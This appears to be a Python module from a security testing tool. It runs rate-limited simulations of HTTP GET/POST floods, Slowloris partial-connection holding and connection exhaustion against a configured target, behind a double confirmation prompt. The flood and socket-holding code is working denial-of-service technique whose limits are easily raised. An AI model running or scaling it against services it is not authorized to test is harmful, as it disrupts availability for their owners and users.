"""DDoS Attacker SIMULATION — authorized CTF labs only.

⚠️  PERINGATAN: Modul ini hanya untuk SIMULASI/TESTING di lingkungan yang
    DIOTORISASI SEPENUHNYA (CTF lab, own infrastructure).

    TIDAK untuk digunakan melawan target tanpa izin eksplisit tertulis.
    Penyalahgunaan bisa melanggar hukum (UU ITE, Computer Fraud and Abuse Act, dll).

Fitur simulasi (READ-ONLY oleh default, butuh --no-safe + konfirmasi):
  - HTTP Flood simulation (GET/POST burst dengan limit)
  - Slowloris simulation (partial request hold)
  - Connection exhaustion simulation
  - Bandwidth saturation test (dengan limit ketat)

SEMUA SERANGAN MEMILIKI BATAS KETAT:
  - Max durasi: 30 detik
  - Max request: 100 per test
  - Max bandwidth: ~1 MB/s
  - Hanya target yang dikonfigurasi (same-origin enforced)
  - Butuh konfirmasi eksplisit "YES I AUTHORIZE THIS SIMULATION"
"""

from __future__ import annotations

import socket
import ssl
import threading
import time
from typing import List, Optional
from urllib.parse import urljoin, urlparse

from .base import BaseModule


class DDoSAttackerSimulationModule(BaseModule):
    name = "DDoS Attacker SIMULATION (Authorized Labs Only)"

    # Safety limits - JANGAN DIUBAH
    MAX_DURATION_SECONDS = 30
    MAX_REQUESTS_TOTAL = 100
    MAX_CONCURRENT_CONNECTIONS = 20
    MAX_PAYLOAD_SIZE = 1024 * 1024  # 1MB

    def run(self) -> None:
        if self.config.safe_mode and not getattr(self.config, "_exploit_allowed", False):
            self.log("Skipped: DDoS attacker simulation requires --no-safe")
            return

        # DOUBLE CONFIRMATION - wajib untuk attack simulation
        if not self._confirm_simulation():
            self.log("DDoS attacker simulation cancelled by operator")
            return

        if not self.config.can_request():
            return

        self.console.print("[red][!] DDoS ATTACKER SIMULATION STARTED[/red]")
        self.console.print("[yellow]    Target: " + self.config.base_url + "[/yellow]")
        self.console.print(f"[yellow]    Limits: {self.MAX_DURATION_SECONDS}s, {self.MAX_REQUESTS_TOTAL} req max, {self.MAX_CONCURRENT_CONNECTIONS} concurrent[/yellow]")

        parsed = urlparse(self.config.base_url)
        host = parsed.hostname or ""
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        scheme = parsed.scheme
        use_ssl = scheme == "https"
        base = self.config.base_url.rstrip("/")

        start_time = time.time()

        try:
            # 1. HTTP Flood Simulation (GET)
            if self.config.can_request() and (time.time() - start_time) < self.MAX_DURATION_SECONDS:
                self._simulate_http_flood(base, "GET", start_time)

            # 2. HTTP Flood Simulation (POST)
            if self.config.can_request() and (time.time() - start_time) < self.MAX_DURATION_SECONDS:
                self._simulate_http_flood(base, "POST", start_time)

            # 3. Slowloris Simulation
            if self.config.can_request() and (time.time() - start_time) < self.MAX_DURATION_SECONDS:
                self._simulate_slowloris(host, port, use_ssl, start_time)

            # 4. Connection Exhaustion Simulation
            if self.config.can_request() and (time.time() - start_time) < self.MAX_DURATION_SECONDS:
                self._simulate_connection_exhaustion(host, port, use_ssl, start_time)

        except KeyboardInterrupt:
            self.log("Simulation interrupted by user")
        except Exception as e:
            self.log(f"Simulation error: {e}")
        finally:
            elapsed = time.time() - start_time
            self.console.print(f"[green][+] DDoS Attacker Simulation completed in {elapsed:.1f}s[/green]")
            self.reporter.add_finding(
                "DDoS Attacker Simulation Completed",
                severity="info",
                detail=f"Simulation ran for {elapsed:.1f}s against {self.config.base_url}. All safety limits enforced.",
                evidence=f"Max duration: {self.MAX_DURATION_SECONDS}s, Max requests: {self.MAX_REQUESTS_TOTAL}",
                url=self.config.base_url,
                method="GET",
                parameter="",
                evidence_snippet=f"Max duration: {self.MAX_DURATION_SECONDS}s, Max requests: {self.MAX_REQUESTS_TOTAL}",
            )

    def _confirm_simulation(self) -> bool:
        """Konfirmasi ganda untuk attack simulation."""
        self.console.print()
        self.console.print("[red]══════════════════════════════════════════════════════[/red]")
        self.console.print("[red]  DDoS ATTACKER SIMULATION - AUTHORIZATION REQUIRED[/red]")
        self.console.print("[red]══════════════════════════════════════════════════════[/red]")
        self.console.print()
        self.console.print("[yellow]PERINGATAN:[/yellow]")
        self.console.print("  • Modul ini mensimulasikan teknik DDoS terhadap target.")
        self.console.print("  • HANYA gunakan di lab CTF / infrastructure ANDA SENDIRI.")
        self.console.print("  • Setiap penyalahgunaan adalah TANGGUNG JAWAB ANDA.")
        self.console.print("  • Safety limits: 30s max, 100 req max, 20 concurrent max.")
        self.console.print()
        self.console.print(f"[cyan]Target:[/cyan] {self.config.base_url}")
        self.console.print()

        try:
            confirm1 = self.console.input("[red]Ketik 'YES I AUTHORIZE THIS SIMULATION' untuk lanjut: [/red]").strip()
            if confirm1 != "YES I AUTHORIZE THIS SIMULATION":
                self.log("Authorization text mismatch - cancelled")
                return False

            confirm2 = self.console.input("[red]Konfirmasi sekali lagi (y/N): [/red]").strip().lower()
            if confirm2 not in ("y", "yes"):
                self.log("Second confirmation failed - cancelled")
                return False

            self.console.print("[green]Authorization confirmed. Starting simulation...[/green]")
            return True
        except (EOFError, KeyboardInterrupt):
            return False

    def _simulate_http_flood(self, base: str, method: str, start_time: float) -> None:
        """Simulasi HTTP flood dengan limit ketat."""
        self.log(f"Simulating {method} flood (max 20 requests)...")

        test_url = urljoin(base + "/", "ddos_test_endpoint")
        sent = 0
        errors = 0
        status_codes = {}

        def worker():
            nonlocal sent, errors
            for _ in range(5):  # 5 per thread * 4 threads = 20 max
                if not self.config.can_request():
                    return
                if (time.time() - start_time) >= self.MAX_DURATION_SECONDS:
                    return
                if sent >= 20:
                    return

                try:
                    if method == "GET":
                        resp = self.rm.get(test_url, allow_redirects=False)
                    else:
                        resp = self.rm.post(test_url, data={"test": "ddos_sim"}, allow_redirects=False)

                    if resp:
                        sent += 1
                        status_codes[resp.status_code] = status_codes.get(resp.status_code, 0) + 1
                    else:
                        errors += 1
                except Exception:
                    errors += 1
                time.sleep(0.1)

        threads = []
        for _ in range(4):
            t = threading.Thread(target=worker)
            threads.append(t)
            t.start()

        for t in threads:
            t.join(timeout=5)

        self.log(f"  {method} flood: {sent} sent, {errors} errors, status: {status_codes}")
        self.reporter.add_finding(
            f"DDoS Simulation: HTTP {method} Flood",
            severity="info",
            detail=f"Simulated {method} flood: {sent} requests sent, {errors} errors",
            evidence=f"Status codes: {status_codes}",
            url=test_url,
            method=method,
            parameter="",
            evidence_snippet=f"Status codes: {status_codes}",
        )

    def _simulate_slowloris(self, host: str, port: int, use_ssl: bool, start_time: float) -> None:
        """Simulasi Slowloris - partial request hold."""
        self.log("Simulating Slowloris (max 5 connections, 10s hold)...")

        connections = []
        successful = 0

        for i in range(5):
            if not self.config.can_request():
                break
            if (time.time() - start_time) >= self.MAX_DURATION_SECONDS:
                break

            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((host, port))
                if use_ssl:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=host)

                # Kirim request tidak lengkap
                partial = f"GET / HTTP/1.1\r\nHost: {host}\r\n".encode()
                sock.sendall(partial)

                connections.append(sock)
                successful += 1
                self.log(f"  Slowloris connection {i+1}/5 established")

            except Exception as e:
                self.log(f"  Slowloris connection {i+1} failed: {e}")

        # Hold connections untuk 10 detik
        if connections:
            self.log(f"  Holding {len(connections)} connections for 10s...")
            time.sleep(10)

            # Kirim header tambahan untuk maintain connection
            for sock in connections:
                try:
                    sock.sendall(b"X-Hold: test\r\n")
                except Exception:
                    pass

            # Close all
            for sock in connections:
                try:
                    sock.close()
                except Exception:
                    pass

        self.log(f"  Slowloris: {successful}/5 connections held for 10s")
        self.reporter.add_finding(
            "DDoS Simulation: Slowloris",
            severity="info",
            detail=f"Simulated Slowloris: {successful}/5 partial connections held for 10s",
            evidence=f"Target: {host}:{port}",
            url=f"{host}:{port}",
            method="GET",
            parameter="",
            evidence_snippet=f"Target: {host}:{port}",
        )

    def _simulate_connection_exhaustion(self, host: str, port: int, use_ssl: bool, start_time: float) -> None:
        """Simulasi connection exhaustion."""
        self.log("Simulating connection exhaustion (max 15 concurrent)...")

        connections = []

        for i in range(15):
            if not self.config.can_request():
                break
            if (time.time() - start_time) >= self.MAX_DURATION_SECONDS:
                break

            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((host, port))
                if use_ssl:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=host)

                connections.append(sock)
            except Exception:
                break

        self.log(f"  Opened {len(connections)} concurrent connections")

        # Hold sebentar
        if connections:
            time.sleep(3)

            for sock in connections:
                try:
                    sock.close()
                except Exception:
                    pass

        self.log(f"  Connection exhaustion: {len(connections)}/15 connections")
        self.reporter.add_finding(
            "DDoS Simulation: Connection Exhaustion",
            severity="info",
            detail=f"Simulated connection exhaustion: {len(connections)}/15 concurrent connections held for 3s",
            evidence=f"Target: {host}:{port}",
            url=f"{host}:{port}",
            method="GET",
            parameter="",
            evidence_snippet=f"Target: {host}:{port}",
        )
